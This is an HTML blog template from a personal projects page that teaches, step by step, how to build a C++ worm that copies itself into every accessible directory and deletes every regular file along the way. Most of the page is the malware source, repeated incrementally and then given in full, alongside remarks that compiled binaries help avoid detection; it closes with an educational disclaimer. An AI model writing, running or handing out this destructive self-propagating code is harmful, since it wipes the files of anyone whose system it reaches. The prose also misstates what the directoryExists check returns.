{% extends "base.html" %} {% block title %}Jo√£o Buschinelli - Projects{% endblock %}

{% block content %}
<h1 id="typing-effect" class="display-2 mb-4"></h1>
<br>
<h2>Description</h2>

<p class="solution-text no-indent">
    One of the simplest malwares one can develop (at least on a local level) is a worm malware. The idea behind
    such a virus is to propagate itself within local directories, starting from a directory that 
    is already infected with it. In this blog post, we will be building a simple worm malware that copies itself 
    from a local directory to all directories within the system, while also deleting everything it encounters along the way.
</p>

<p class="solution-text no-indent">
    Being good malware developers, we will implement it in C++. However, this malware can also be created in other 
    programming languages such as Python. I have opted for C++ because binary executables are more challenging to interpret
    compared to source code, making it less likely to be detected as a virus.
</p>

<h3>Scripts</h3>

<p class="solution-text no-indent">
    We will divide the script into two files: one header file containing a class to track visited 
    directories, and another C++ file that contains the actual worm.
</p>

<h4>Directory History header file</h4>

<p class="solution-text no-indent">
    The first step is to create a header file that contains a class which will serve as a directory history tracker.
    This class ensures that the malware does not repeat its actions in the same directory. We will import this class 
    in the actual malware code. I have named this file "dir-hist.h".
</p>

<p class="solution-text no-indent">
    When creating a header file, it is a good practice to begin the code with the following lines:
</p>

<div class="shrink">
    <pre>
        <code id="text" class="hljs language-c++">
            #ifndef dirhist_H
            #define dirhist_H
            // code goes here
            #endif
        </code>
    </pre>
</div>

<p class="solution-text no-indent">
    Let's discuss how to build a script to track the history of visited directories. In the class, we should have at least two public members:
    a function that adds a directory to the history and another one to check if a directory exists within the history.
    Additionally, we will need a private member function responsible for fetching the current directory. Combining all three functions, we should follow this flow: get the current directory, check if we have already visited it. If we have, do nothing. If we haven't, add it to the visited directory history. To achieve this behavior, we need to include the `filesystem`, `vector`, and `algorithm` modules.
</p>

<div class="shrink">
    <pre>
        <code id="text" class="hljs language-c++">
            #ifndef dirhist_H
            #define dirhist_H
            #include &lt;filesystem&gt;
            #include &lt;string&gt;
            #include &lt;vector&gt;
            #include &lt;algorithm&gt;
            #include &lt;iostream&gt;

            class DirectoryHistory {
            public:
                DirectoryHistory() {
                }

                void addDirectory(const std::string& dir) {
                }

                bool directoryExists(const std::string& dir) {
                }

            private:
                std::string getCurrentDirectory() const {
                }

                // Initializes the private history variable to store the directories visited
                std::vector&lt;std::string&gt; history_;
            };
            #endif
        </code>
    </pre>
</div>

<p class="solution-text no-indent">
    Here, we have defined all the necessary methods and declared the directory history variable as a private member.
    Inside the `DirectoryHistory` class, we should call the private method `getCurrentDirectory` and add it to the history private 
    variable. The `addDirectory` method should simply add the `dir` variable to the history vector:
</p>

<div class="shrink">
    <pre>
        <code id="text" class="hljs language-c++">
            #ifndef dirhist_H
            #define dirhist_H
            #include &lt;filesystem&gt;
            #include &lt;string&gt;
            #include &lt;vector&gt;
            #include &lt;algorithm&gt;
            #include &lt;iostream&gt;

            class DirectoryHistory {
            public:
                DirectoryHistory() {
                    std::string current_dir = getCurrentDirectory();
                    history_.push_back(current_dir);
                }

                void addDirectory(const std::string& dir) {
                    history_.push_back(dir);
                }

                bool directoryExists(const std::string& dir) {
                }

            private:
                std::string getCurrentDirectory() const {
                }

                // Initializes the private history variable to store the directories visited
                std::vector&lt;std::string&gt; history_;
            };
            #endif
        </code>
    </pre>
</div>

<p class="solution-text no-indent">
    In the `directoryExists` method, we will utilize the `std::find` function to search for the presence of a directory within 
    the private history variable. We will compare it against the `dir` variable passed as an argument:
</p>

<div class="shrink">
    <pre>
        <code id="text" class="hljs language-c++">
            #ifndef dirhist_H
            #define dirhist_H
            #include &lt;filesystem&gt;
            #include &lt;string&gt;
            #include &lt;vector&gt;
            #include &lt;algorithm&gt;
            #include &lt;iostream&gt;

            class DirectoryHistory {
            public:
                DirectoryHistory() {
                    std::string current_dir = getCurrentDirectory();
                    history_.push_back(current_dir);
                }

                void addDirectory(const std::string& dir) {
                    history_.push_back(dir);
                }

                bool directoryExists(const std::string& dir) {
                    return std::find(history_.begin(), history_.end(), dir) != history_.end();
                }

            private:
                std::string getCurrentDirectory() const {
                }

                // Initializes the private history variable to store the directories visited
                std::vector&lt;std::string&gt; history_;
            };
            #endif
        </code>
    </pre>
</div>


<p class="solution-text no-indent">
    If the directory is found, the return statement evaluates to `false` because the directory exists in the history. On the other hand, if the directory is not found, the return statement evaluates to `true` because the directory does not exist in the history.
</p>

<p class="solution-text no-indent">
    Finally, in the `getCurrentDirectory` method, we need to return a string representing the name of the current directory we are in. For this purpose, we will use the `filesystem` module.
</p>

<div class="shrink">
    <pre>
        <code id="text" class="hljs language-c++">
            #ifndef dirhist_H
            #define dirhist_H
            #include &lt;filesystem&gt;
            #include &lt;string&gt;
            #include &lt;vector&gt;
            #include &lt;algorithm&gt;
            #include &lt;iostream&gt;

            class DirectoryHistory {
            public:
                DirectoryHistory() {
                    std::string current_dir = getCurrentDirectory();
                    history_.push_back(current_dir);
                }

                void addDirectory(const std::string& dir) {
                    history_.push_back(dir);
                }

                bool directoryExists(const std::string& dir) {
                    return std::find(history_.begin(), history_.end(), dir) != history_.end();
                }

            private:
                std::string getCurrentDirectory() const {
                    return std::filesystem::current_path().string();
                }

                // Initializes the private history variable to store the directories visited
                std::vector&lt;std::string&gt; history_;
            };
            #endif
        </code>
    </pre>
</div>

<p class="solution-text no-indent">
    And we are done in this part.
</p>

<h4>Worm script</h4>

<p class="solution-text no-indent">
    Now we are ready to build our worm (the fun part). Let's break down what we need here. First, the worm needs to identify the subdirectories within the current directory it resides in. We also need a method that propagates the worm to any directories it encounters that have not already been infected. The other two methods we require are one that deletes everything inside the current directory it is in and the actual exploit method. Lastly, we need global variables to determine the origin directory (starting point) and to reference the directory history class we created earlier. To accomplish all of this, we need the `iostream`, `fstream`, `filesystem`, and `vector` modules, as well as the `dirhist` class.
</p>

<div class="shrink">
    <pre>
        <code id="text" class="hljs language-c++">
            #include &lt;iostream&gt;
            #include &lt;vector&gt;
            #include &lt;fstream&gt;
            #include &lt;filesystem&gt;
            #include "dir-hist.h"

            DirectoryHistory dirhist;
            std::string first_origin = std::filesystem::current_path();
            std::string file_path = first_origin + "/worm";

            std::vector&lt;std::string&gt; checkSubDir(const std::string& path) {
            }

            void deleteAll(std::string path) {
            }

            void propagate(std::string destination) {
            }

            std::filesystem::path exploit(std::filesystem::path origin, std::vector&lt;std::string&gt; sub_dirs) {
            }

            int main() {
                return 0;
            }
        </code>
    </pre>
</div>

<p class="solution-text no-indent">
    Let's begin with the `checkSubDir` method. Here, we aim to obtain a list of all subdirectories within the provided path. We start by declaring a variable to store the subdirectories. Using the `directory_iterator` method from the `filesystem` module, we create a for loop to iterate through all entries in the current path. We then check if each entry is a directory. If it is, we append the path of that directory to our variable.
</p>

<div class="shrink">
    <pre>
        <code id="text" class="hljs language-c++">
            #include &lt;iostream&gt;
            #include &lt;vector&gt;
            #include &lt;fstream&gt;
            #include &lt;filesystem&gt;
            #include "dir-hist.h"

            DirectoryHistory dirhist;
            std::string first_origin = std::filesystem::current_path();
            std::string file_path = first_origin + "/worm";

            std::vector&lt;std::string&gt; checkSubDir(const std::string& path) {
                std::vector&lt;std::string&gt; sub_dirs;

                for (const auto& entry : std::filesystem::directory_iterator(path)) {
                    if (entry.is_directory()) {
                        std::string dir = entry.path().filename().string();
                        sub_dirs.push_back(dir);
                    }
                }

                return sub_dirs;
            }

            void deleteAll(std::string path) {
            }

            void propagate(std::string destination) {
            }

            std::filesystem::path exploit(std::filesystem::path origin, std::vector&lt;std::string&gt; sub_dirs) {
            }

            int main() {
                return 0;
            }
        </code>
    </pre>
</div>

<p class="solution-text no-indent">
    The next method is the `deleteAll` function. This function is straightforward. We want to delete all files within the 
    current directory. For the purpose of this malware, that is the desired action. However, a worm could potentially perform 
    other malicious activities, such as encrypting files or executing other harmful actions within the current directory.
</p>

<p class="solution-text no-indent">
    To implement this function, we will do something similar to the previous one: iterate over all entries in 
    the directory we are in, check if it is a file, if yes then delete it.
</p>

<div class="shrink">
    <pre>
        <code id="text" class="hljs language-c++">
            #include &lt;iostream&gt;
            #include &lt;vector&gt;
            #include &lt;fstream&gt;
            #include &lt;filesystem&gt;
            #include "dir-hist.h"

            DirectoryHistory dirhist;
            std::string first_origin = std::filesystem::current_path();
            std::string file_path = first_origin + "/worm";

            std::vector&lt;std::string&gt; checkSubDir(const std::string& path) {
                std::vector&lt;std::string&gt; sub_dirs;

                for (const auto& entry : std::filesystem::directory_iterator(path)) {
                    if (entry.is_directory()) {
                        std::string dir = entry.path().filename().string();
                        sub_dirs.push_back(dir);
                    }
                }

                return sub_dirs;
            }

            void deleteAll(std::string path) {
                for (const auto& entry : std::filesystem::directory_iterator(path)) {
                    if (std::filesystem::is_regular_file(entry)) {
                        std::filesystem::remove(entry);
                    }
                }
            }

            void propagate(std::string destination) {
            }

            std::filesystem::path exploit(std::filesystem::path origin, std::vector&lt;std::string&gt; sub_dirs) {
            }

            int main() {
                return 0;
            }
        </code>
    </pre>
</div>

<p class="solution-text no-indent">
    The `propagate` function is responsible for copying the worm executable file into the destination directory. 
    To achieve this, we need to read the contents of the worm file, create a new file in the destination directory, 
    and then write the contents to it. Here's how you can accomplish this:
</p>

<div class="shrink">
    <pre>
        <code id="text" class="hljs language-c++">
            #include &lt;iostream&gt;
            #include &lt;vector&gt;
            #include &lt;fstream&gt;
            #include &lt;filesystem&gt;
            #include "dir-hist.h"

            DirectoryHistory dirhist;
            std::string first_origin = std::filesystem::current_path();
            std::string file_path = first_origin + "/worm";

            std::vector&lt;std::string&gt; checkSubDir(const std::string& path) {
                std::vector&lt;std::string&gt; sub_dirs;

                for (const auto& entry : std::filesystem::directory_iterator(path)) {
                    if (entry.is_directory()) {
                        std::string dir = entry.path().filename().string();
                        sub_dirs.push_back(dir);
                    }
                }

                return sub_dirs;
            }

            void deleteAll(std::string path) {
                for (const auto& entry : std::filesystem::directory_iterator(path)) {
                    if (std::filesystem::is_regular_file(entry)) {
                        std::filesystem::remove(entry);
                    }
                }
            }

            void propagate(std::string destination) {
                std::ifstream worm_file(file_path, std::ios::binary);
                std::ofstream dst_worm(destination + "/worm", std::ios::binary);
                char buffer[2048];

                while (worm_file.read(buffer, sizeof(buffer))) {
                    dst_worm.write(buffer, worm_file.gcount());
                }

                dst_worm.close();
                worm_file.close();
            }

            std::filesystem::path exploit(std::filesystem::path origin, std::vector&lt;std::string&gt; sub_dirs) {
            }

            int main() {
                return 0;
            }
        </code>
    </pre>
</div>

<p class="solution-text no-indent">
    The last method is the actual worm exploit, and it is the most complex one in this code. I have chosen to implement it recursively because it seemed easier to do so. The main idea behind this method is to add the origin path to the directory history. Then, we enter a for loop that iterates over each subdirectory string in the sub_dirs variable. Inside the loop, we check if the current subdirectory exists in our directory history. If it does not, we add it to the history and proceed to search for all subdirectories inside it. We define this current subdirectory as the new origin, which will be passed recursively to the exploit function. Next, we delete all files within the current subdirectory and propagate the worm to that subdirectory. It is important to perform these actions in this order to avoid deleting the worm that has been propagated. Within the same if statement, we call the exploit function again with the new parameters.</p>

<p class="solution-text no-indent">
    After the completion of the for loop, it indicates that we have reached the innermost subdirectory starting from the initial point. At this stage, the worm needs to backtrack to the parent directory, examine all the subdirectories within the parent, and then recursively call the exploit function again. This approach ensures that the worm visits each and every directory within the system, executing its intended actions.
</p>

<div class="shrink">
    <pre>
        <code id="text" class="hljs language-c++">
            #include &lt;iostream&gt;
            #include &lt;vector&gt;
            #include &lt;fstream&gt;
            #include &lt;filesystem&gt;
            #include "dir-hist.h"

            DirectoryHistory dirhist;
            std::string first_origin = std::filesystem::current_path();
            std::string file_path = first_origin + "/worm";

            std::vector&lt;std::string&gt; checkSubDir(const std::string& path) {
                std::vector&lt;std::string&gt; sub_dirs;

                for (const auto& entry : std::filesystem::directory_iterator(path)) {
                    if (entry.is_directory()) {
                        std::string dir = entry.path().filename().string();
                        sub_dirs.push_back(dir);
                    }
                }

                return sub_dirs;
            }

            void deleteAll(std::string path) {
                for (const auto& entry : std::filesystem::directory_iterator(path)) {
                    if (std::filesystem::is_regular_file(entry)) {
                        std::filesystem::remove(entry);
                    }
                }
            }

            void propagate(std::string destination) {
                std::ifstream worm_file(file_path, std::ios::binary);
                std::ofstream dst_worm(destination + "/worm", std::ios::binary);
                char buffer[2048];

                while (worm_file.read(buffer, sizeof(buffer))) {
                    dst_worm.write(buffer, worm_file.gcount());
                }

                dst_worm.close();
                worm_file.close();
            }

            std::filesystem::path exploit(std::filesystem::path origin, std::vector&lt;std::string&gt; sub_dirs) {
                std::string origin_str = origin.string();
                dirhist.addDirectory(origin_str);

                for (const std::string& sub : sub_dirs) {
                    std::string path_to_sub_str = origin_str + "/" + sub;

                    if (!dirhist.directoryExists(path_to_sub_str)) {
                        std::vector&lt;std::string&gt; subs_inside = checkSubDir(path_to_sub_str);
                        std::filesystem::path new_origin(path_to_sub_str);
                        deleteAll(path_to_sub_str);
                        propagate(path_to_sub_str);
                        return exploit(new_origin, subs_inside);
                    }
                }

                std::filesystem::path parent = origin.parent_path();
                std::string parent_str = parent.string();
                std::vector&lt;std::string&gt; parent_subs = checkSubDir(parent_str);
                deleteAll(parent_str);
                propagate(parent_str);
                return exploit(parent, parent_subs);
            }

            int main() {
                return 0;
            }
        </code>
    </pre>
</div>

<p class="solution-text no-indent">
    Finally, in the main function, we declare the sub_dirs variable by obtaining all the subdirectories within the directory where the initial worm is located. We then proceed to call the exploit function, passing the origin directory and the sub_dirs as arguments. This initiates the execution of the worm's propagation throughout the system. The complete code is as follows:
</p>

<div class="shrink">
    <pre>
        <code id="text" class="hljs language-c++">
            #include &lt;iostream&gt;
            #include &lt;vector&gt;
            #include &lt;fstream&gt;
            #include &lt;filesystem&gt;
            #include "dir-hist.h"

            DirectoryHistory dirhist;
            std::string first_origin = std::filesystem::current_path();
            std::string file_path = first_origin + "/worm";

            std::vector&lt;std::string&gt; checkSubDir(const std::string& path) {
                std::vector&lt;std::string&gt; sub_dirs;

                for (const auto& entry : std::filesystem::directory_iterator(path)) {
                    if (entry.is_directory()) {
                        std::string dir = entry.path().filename().string();
                        sub_dirs.push_back(dir);
                    }
                }

                return sub_dirs;
            }

            void deleteAll(std::string path) {
                for (const auto& entry : std::filesystem::directory_iterator(path)) {
                    if (std::filesystem::is_regular_file(entry)) {
                        std::filesystem::remove(entry);
                    }
                }
            }

            void propagate(std::string destination) {
                std::ifstream worm_file(file_path, std::ios::binary);
                std::ofstream dst_worm(destination + "/worm", std::ios::binary);
                char buffer[2048];

                while (worm_file.read(buffer, sizeof(buffer))) {
                    dst_worm.write(buffer, worm_file.gcount());
                }

                dst_worm.close();
                worm_file.close();
            }

            std::filesystem::path exploit(std::filesystem::path origin, std::vector&lt;std::string&gt; sub_dirs) {
                std::string origin_str = origin.string();
                dirhist.addDirectory(origin_str);

                for (const std::string& sub : sub_dirs) {
                    std::string path_to_sub_str = origin_str + "/" + sub;

                    if (!dirhist.directoryExists(path_to_sub_str)) {
                        std::vector&lt;std::string&gt; subs_inside = checkSubDir(path_to_sub_str);
                        std::filesystem::path new_origin(path_to_sub_str);
                        deleteAll(path_to_sub_str);
                        propagate(path_to_sub_str);
                        return exploit(new_origin, subs_inside);
                    }
                }

                std::filesystem::path parent = origin.parent_path();
                std::string parent_str = parent.string();
                std::vector&lt;std::string&gt; parent_subs = checkSubDir(parent_str);
                deleteAll(parent_str);
                propagate(parent_str);
                return exploit(parent, parent_subs);
            }

            int main() {
                std::vector&lt;std::string&gt; sub_dirs = checkSubDir(first_origin);
                exploit(first_origin, sub_dirs);
                return 0;
            }
        </code>
    </pre>
</div>

<p class="solution-text no-indent">
    We are done! This is a simple worm that should go inside every directory (at least the ones we don't need elevated permissions to go in) and 
    deletes all the contents inside it.
</p>

<h3>Disclaimer</h3>
<p class="solution-text no-indent">
    This malware project is solely intended to provide educational insights into the development of a worm malware. The purpose is to enhance understanding and awareness of potential security risks. I strongly discourage any malicious activities or unauthorized use of this information. Any usage or implementation of such code is entirely at your own risk, and you are solely responsible for any consequences that may arise.    
</p>

<a href="/projects/malware-dev">Go back</a>

{% endblock %}